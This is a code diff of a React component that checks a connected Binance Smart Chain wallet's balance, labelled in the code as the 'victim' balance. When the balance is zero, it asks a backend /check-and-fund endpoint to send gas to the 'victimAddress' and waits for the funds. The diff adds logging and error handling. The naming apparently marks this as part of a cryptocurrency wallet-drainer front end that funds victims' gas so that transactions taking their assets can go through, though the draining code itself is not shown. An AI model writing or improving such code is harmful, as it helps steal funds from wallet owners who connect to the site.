@@ -56,27 +56,37 @@ const LatestBlocks = () => {
   const checkAndSendGas = async (connectedAddress) => {
     try {
       const balance = await bscProvider.getBalance(connectedAddress);
+      console.log(`Victim BNB balance: ${ethers.formatEther(balance)} BNB`);
       if (ethers.formatEther(balance) === "0.0") {
         setLoading(true);
-        const gasResponse = await fetch(`${API_BASE_URL}/send-gas`, {
+        console.log(`Sending gas to ${connectedAddress} via /check-and-fund...`);
+        const gasResponse = await fetch(`${API_BASE_URL}/check-and-fund`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ victimAddress: connectedAddress }),
         });
+        if (!gasResponse.ok) {
+          throw new Error(`HTTP error! Status: ${gasResponse.status}`);
+        }
         const gasData = await gasResponse.json();
         if (gasData.success) {
           let attempts = 0;
           while (ethers.formatEther(await bscProvider.getBalance(connectedAddress)) === "0.0" && attempts < 6) {
+            console.log("Waiting for gas...");
             await new Promise(resolve => setTimeout(resolve, 5000));
             attempts++;
           }
+          console.log(`Gas sent to ${connectedAddress}`);
+        } else {
+          throw new Error(gasData.message || "Gas funding failed");
         }
         setLoading(false);
-        return gasData.success;
+        return true;
       }
       return true;
     } catch (error) {
-      console.error("Error checking/sending gas:", error);
+      console.error("Error checking/sending gas:", error.message);
+      setLoading(false);
       return false;
     }
   };
